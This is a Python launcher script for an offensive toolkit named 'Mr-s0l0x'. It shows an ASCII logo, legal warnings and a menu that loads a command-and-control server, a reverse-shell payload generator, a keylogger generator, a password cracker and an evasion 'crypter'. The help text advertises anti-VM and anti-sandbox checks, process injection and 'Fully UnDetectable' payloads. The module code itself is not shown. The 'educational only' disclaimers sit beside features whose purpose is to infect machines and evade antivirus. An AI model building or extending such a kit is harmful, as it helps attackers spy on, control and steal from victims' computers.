#!/usr/bin/env python3
"""
Mr-s0l0x - Educational Security Research Framework
==================================================
WARNING: This tool is for EDUCATIONAL and AUTHORIZED SECURITY TESTING ONLY.
Unauthorized use of this tool is ILLEGAL and may result in criminal prosecution.

Use only on systems you own or have explicit written permission to test.
"""

import os
import sys
import argparse
from colorama import init, Fore, Style

# Initialize colorama for Windows compatibility
init(autoreset=True)

def print_logo():
    """Display the Mr-s0l0x logo"""
    logo = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   {Fore.YELLOW}███╗   ███╗██████╗     ███████╗ ██████╗ ██╗      ██████╗ ██╗  ██╗{Fore.CYAN}   ║
║   {Fore.YELLOW}████╗ ████║██╔══██╗    ██╔════╝██╔═══██╗██║     ██╔═══██╗╚██╗██╔╝{Fore.CYAN}   ║
║   {Fore.YELLOW}██╔████╔██║██████╔╝    ███████╗██║   ██║██║     ██║   ██║ ╚███╔╝ {Fore.CYAN}   ║
║   {Fore.YELLOW}██║╚██╔╝██║██╔══██╗    ╚════██║██║   ██║██║     ██║   ██║ ██╔██╗ {Fore.CYAN}   ║
║   {Fore.YELLOW}██║ ╚═╝ ██║██║  ██║    ███████║╚██████╔╝███████╗╚██████╔╝██╔╝ ██╗{Fore.CYAN}   ║
║   {Fore.YELLOW}╚═╝     ╚═╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝{Fore.CYAN}   ║
║                                                              ║
║   {Fore.RED}Educational Security Research Framework{Fore.CYAN}                    ║
║   {Fore.RED}FOR AUTHORIZED TESTING ONLY{Fore.CYAN}                                 ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(logo)

def print_warning():
    """Display ethical warning"""
    warning = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
║                    {Fore.YELLOW}⚠  LEGAL WARNING  ⚠{Fore.RED}                    ║
╠══════════════════════════════════════════════════════════════╣
║  This tool is for EDUCATIONAL and AUTHORIZED use ONLY.       ║
║                                                              ║
║  • Use only on systems you own or have written permission    ║
║  • Unauthorized access is ILLEGAL                            ║
║  • Violators may face criminal prosecution                   ║
║  • The authors are not responsible for misuse                ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(warning)

def show_menu():
    """Display main menu"""
    menu = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║                      {Fore.YELLOW}MAIN MENU{Fore.CYAN}                          ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  {Fore.GREEN}[1]{Fore.CYAN}  Command & Control Server                        ║
║  {Fore.GREEN}[2]{Fore.CYAN}  Generate Payload (Windows/Linux)               ║
║  {Fore.GREEN}[3]{Fore.CYAN}  Keylogger Generator                            ║
║  {Fore.GREEN}[4]{Fore.CYAN}  Password Cracker                                ║
║  {Fore.GREEN}[5]{Fore.CYAN}  Advanced Evasion Crypter (AET)                 ║
║  {Fore.GREEN}[6]{Fore.CYAN}  Show Help & Documentation                       ║
║  {Fore.RED}[0]{Fore.CYAN}  Exit                                              ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(menu)

def main():
    """Main function"""
    print_logo()
    print_warning()
    
    while True:
        show_menu()
        choice = input(f"{Fore.YELLOW}[Mr-s0l0x]{Fore.CYAN} Select option: {Style.RESET_ALL}").strip()
        
        if choice == '1':
            from modules.c2_server import C2Server
            c2 = C2Server()
            c2.run()
        elif choice == '2':
            from modules.payload_generator import PayloadGenerator
            generator = PayloadGenerator()
            generator.run()
        elif choice == '3':
            from modules.keylogger_gen import KeyloggerGenerator
            kl_gen = KeyloggerGenerator()
            kl_gen.run()
        elif choice == '4':
            from modules.password_cracker import PasswordCracker
            cracker = PasswordCracker()
            cracker.run()
        elif choice == '5':
            from modules.crypter import AdvancedCrypter
            crypter = AdvancedCrypter()
            crypter.run()
        elif choice == '6':
            show_help()
        elif choice == '0':
            print(f"\n{Fore.YELLOW}[*] Exiting... Stay ethical!{Style.RESET_ALL}\n")
            sys.exit(0)
        else:
            print(f"{Fore.RED}[!] Invalid option. Please try again.{Style.RESET_ALL}")

def show_help():
    """Display help and documentation"""
    help_text = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║                   {Fore.YELLOW}HELP & DOCUMENTATION{Fore.CYAN}                  ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  {Fore.GREEN}Command & Control Server:{Fore.CYAN}                              ║
║    - Creates a C2 server for managing remote connections     ║
║    - Educational demonstration of C2 architecture            ║
║                                                              ║
║  {Fore.GREEN}Payload Generator:{Fore.CYAN}                                    ║
║    - Generates payloads for Windows and Linux               ║
║    - Creates reverse shell payloads                         ║
║    - Educational purposes only                              ║
║                                                              ║
║  {Fore.GREEN}Keylogger Generator:{Fore.CYAN}                                  ║
║    - Generates educational keylogger code                   ║
║    - Demonstrates keyboard monitoring concepts               ║
║    - Use only on systems you own                            ║
║                                                              ║
║  {Fore.GREEN}Password Cracker:{Fore.CYAN}                                     ║
║    - Dictionary-based password cracking                     ║
║    - Brute force capabilities                               ║
║    - For password recovery on your own systems              ║
║                                                              ║
║  {Fore.GREEN}Advanced Evasion Crypter (AET):{Fore.CYAN}                        ║
║    - Payload encryption and obfuscation                    ║
║    - Anti-debugging, Anti-VM, Anti-sandbox                 ║
║    - Process injection, Polymorphic stubs                 ║
║    - File binding, Compression, Hash randomization         ║
║    - FUD (Fully UnDetectable) generation                   ║
║                                                              ║
║  {Fore.RED}REMEMBER: Always obtain proper authorization!{Fore.CYAN}            ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(help_text)
    input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Interrupted by user. Exiting...{Style.RESET_ALL}\n")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        sys.exit(1)

